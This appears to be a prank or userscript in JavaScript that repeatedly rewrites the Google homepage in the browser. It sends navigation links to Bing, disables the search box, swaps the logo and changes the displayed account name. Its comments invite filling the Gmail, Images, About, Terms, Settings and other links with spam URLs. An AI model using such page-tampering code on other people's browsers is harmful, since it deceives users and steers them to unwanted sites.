setTimeout(function() {
	setInterval(function() {

		// change default links to Bing
		var navDiv = document.getElementsByClassName("gb_jb gb_Vf gb_R gb_Uf gb_Zf gb_T")[0];
		var links = navDiv.querySelectorAll('a');

		for (var i = 0; i < links.length; i++) {
			links[i].href = 'http://www.bing.com';
		}

		// change named displayed with Gmail
		document.getElementsByClassName("gb_vb gb_wb")[0].innerHTML = 'Name Displayed w/ Gmail';

		// disable search bar
		var input = document.querySelector('#lst-ib');
		input.disabled = true;

		// change logo to Bing's logo (or any image hosted on a https website)
		var googleImg = document.querySelector('#hplogo');
		googleImg.srcset = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-qxBr_f2zPlQ7HL9Ach-6sHMJLIcZxkIJYYmNDwkKm2zXj5jJK3NgnuTu8g';
		googleImg.style.width = '200px';

		// spam links
		// delete below if you only want the links to go to one specific website (Bing)
		// otherwise, pick various spam links to insert in the parentheses
		var gmail = document.querySelector('a[data-pid="23"]');
		gmail.href = ''; // <-- insert spam link here

		var img = document.querySelector('a[data-pid="2"]');
		img.href = ''; // <-- insert spam link here

		var options = document.querySelectorAll('#gbwa a')[0];
		options.href = ''; // <-- insert spam link here

		var ads = document.querySelector('a[href="//www.google.com/intl/en/ads/?fg=1"]');
		ads.href = ''; // <-- insert spam link here

		var biz = document.querySelector('a[href="//www.google.com/services/?fg=1"]');
		biz.href = ''; // <-- insert spam link here

		var abt = document.querySelector('a[href="//www.google.com/intl/en/about.html?fg=1"]');
		abt.href = ''; // <-- insert spam link here

		var privacy = document.querySelector('a[href="//www.google.com/intl/en/policies/privacy/?fg=1"]');
		privacy.href = '';

		var terms = document.querySelector('a[href="//www.google.com/intl/en/policies/terms/?fg=1"]');
		terms.href = ''; // <-- insert spam link here

		var settings = document.querySelector('#fsettl');
		settings.href = ''; // <-- insert spam link here
	}, 2000)
}, 0);